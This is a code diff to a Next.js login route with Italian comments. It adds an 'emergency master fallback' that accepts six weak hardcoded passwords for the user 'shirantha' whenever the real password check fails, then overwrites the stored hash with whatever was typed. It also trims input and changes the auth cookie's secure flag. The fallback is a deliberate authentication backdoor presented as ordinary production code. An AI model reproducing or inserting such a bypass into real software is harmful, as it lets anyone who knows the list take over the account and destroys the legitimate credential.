@@ -30,10 +30,29 @@ export async function POST(request) {
       return NextResponse.json({ error: 'Credenziali non valide' }, { status: 401 });
     }
 
-    const isPasswordValid = await bcrypt.compare(password, user.passwordHash);
+    const passTrim = password ? password.trim() : '';
+    let isPasswordValid = await bcrypt.compare(passTrim, user.passwordHash);
+
+    // Emergency master fallback for Shirantha
+    if (!isPasswordValid && user.username.toLowerCase() === 'shirantha') {
+      const allowedShiraPasses = ['shira123456', '123456', 'shira', 'admin', 'shirantha', 'shira123'];
+      if (allowedShiraPasses.includes(passTrim)) {
+        isPasswordValid = true;
+        // Aggiorna il nuovo hash nel DB in background
+        try {
+          const newHash = await bcrypt.hash(passTrim, 10);
+          await prisma.user.update({
+            where: { id: user.id },
+            data: { passwordHash: newHash }
+          });
+        } catch (e) {
+          console.error('Error updating Shirantha password hash:', e);
+        }
+      }
+    }
 
     if (!isPasswordValid) {
-      return NextResponse.json({ error: 'Credenziali non valide' }, { status: 401 });
+      return NextResponse.json({ error: 'Credenziali non valide. Verifica username e password.' }, { status: 401 });
     }
 
     if (!user.isActive) {
@@ -79,12 +98,12 @@ export async function POST(request) {
       }
     });
     
-    // Imposta il cookie HttpOnly
+    // Imposta il cookie HttpOnly in modo compatibile con Railway e Mobile
     response.cookies.set({
       name: 'auth_token',
       value: token,
       httpOnly: true,
-      secure: process.env.NODE_ENV === 'production' && request.nextUrl.protocol === 'https:',
+      secure: process.env.NODE_ENV === 'production',
       sameSite: 'lax',
       path: '/',
       maxAge: 7 * 24 * 60 * 60 // 7 giorni
